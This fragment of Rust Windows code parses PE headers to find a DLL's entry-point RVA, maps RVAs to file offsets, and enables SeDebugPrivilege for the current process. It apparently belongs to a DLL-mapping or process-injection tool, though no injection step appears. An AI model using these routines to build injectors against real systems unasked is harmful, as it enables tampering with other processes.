        let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
        let optional_header = &dll_data[e_lfanew + 0x18..];
        let entry_rva = u32::from_le_bytes(optional_header[0x10..0x14].try_into().unwrap());
        Ok(entry_rva)
    }
}

    /// Converts a Relative Virtual Address (RVA) to a file offset.
    fn rva_to_offset(pe_data: &[u8], rva: usize) -> anyhow::Result<usize> {
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let file_header = unsafe { &(*nt_headers_ptr).FileHeader };
        let optional_header = unsafe { &(*nt_headers_ptr).OptionalHeader };

        let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };

        for section in sections {
            if rva >= section.VirtualAddress as usize && rva < (section.VirtualAddress + unsafe { section.Misc.VirtualSize }) as usize {
                return Ok((rva - section.VirtualAddress as usize) + section.PointerToRawData as usize);
            }
        }
        
        if rva < optional_header.SizeOfHeaders as usize {
            return Ok(rva);
        }

        Err(anyhow::anyhow!("RVA 0x{:X} not found in any section or header", rva))
    }

// Enable SeDebugPrivilege for the current process
pub fn enable_debug_privilege() -> anyhow::Result<(), anyhow::Error> {
    unsafe {
        let mut h_token: HANDLE = HANDLE(std::ptr::null_mut());

        OpenProcessToken(
            GetCurrentProcess(), 
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
            &mut h_token
        ).context("OpenProcessToken failed")?;

        let mut luid = LUID::default();

        LookupPrivilegeValueA(
            None, 
            PCSTR(b"SeDebugPrivilege\0".as_ptr()), 
            &mut luid
        ).context("LookupPrivilegeValueA failed")?;

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }; 1],
        };
        AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None).context("AdjustTokenPrivileges failed")?;
    }
    Ok(())
}